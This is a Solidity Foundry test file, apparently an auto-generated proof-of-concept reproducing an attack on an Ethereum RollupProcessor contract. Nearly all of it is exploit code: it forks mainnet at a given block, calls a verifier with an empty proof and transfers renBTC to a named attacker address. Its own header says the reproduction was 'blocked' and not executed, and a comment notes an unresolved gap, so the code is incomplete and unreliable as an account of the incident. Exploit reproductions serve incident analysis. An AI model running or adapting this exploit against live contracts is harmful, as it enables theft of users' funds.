// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x6952d9246e9afe8b887b2877225163436f78e97f
// Attack Contract : 0x737901bea3eeb88459df9ef1be8ff3ae1b42a2ba
// Vulnerable Contract : 0x737901bea3eeb88459df9ef1be8ff3ae1b42a2ba
// Attack Tx : 0x9e1d6ab7c20ae235409d7dd3a9cd47c04f07293585b3498b8beed82d6f6b03ca
// Block : 25339172
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : blocked
// Economic Proof : not_executed
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.RollupProcessor;
    uint256 constant FORK_BLOCK = 25339171;
    uint256 constant TX_TIMESTAMP = 1781722223;
    uint256 constant TX_BLOCK_NUMBER = 25339172;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        RollupProcessorAttack attack = _deployAttack();
        _prepareProfit(address(attack), address(0));
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (RollupProcessorAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = RollupProcessorAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new RollupProcessorAttack();
        }
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(RollupProcessorAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.renBTC, "renBTC", 46963295);
    }
}

contract RollupProcessorAttack {
    function attack() external payable {
        _verifyRollup();
        _collectRenBtc();
    }

    receive() external payable {}

    function escapeHatch(bytes calldata proof, bytes calldata, bytes calldata) external payable {
        proof;
        _verifyRollup();
        _collectRenBtc();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function _verifyRollup() internal view {
        // Unresolved gap: action graph marks the intervening storage writes as missing_semantic_match,
        // so this PoC does not emulate them with runtime sstore.
        ITurboVerifier(Addresses.TurboVerifier).verify(hex"", 0);
    }

    function _collectRenBtc() internal {
        IERC20Like(Addresses.renBTC).transfer(Addresses.attacker_eoa, 46963295);
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant TurboVerifier = 0x48Cb7BA00D087541dC8E2B3738f80fDd1FEe8Ce8;
    address internal constant attacker_eoa = 0x6952d9246e9aFE8B887B2877225163436F78E97F;
    address internal constant RollupProcessor = 0x737901bea3eeb88459df9ef1BE8fF3Ae1B42A2ba;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant RenERC20LogicV1 = 0xe2d6cCAC3EE3A21AbF7BeDBE2E107FfC0C037e80;
    address internal constant renBTC = 0xEB4C2781e4ebA804CE9a9803C67d0893436bB27D;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface ITurboVerifier {
    function verify(bytes calldata, uint256) external view;
}
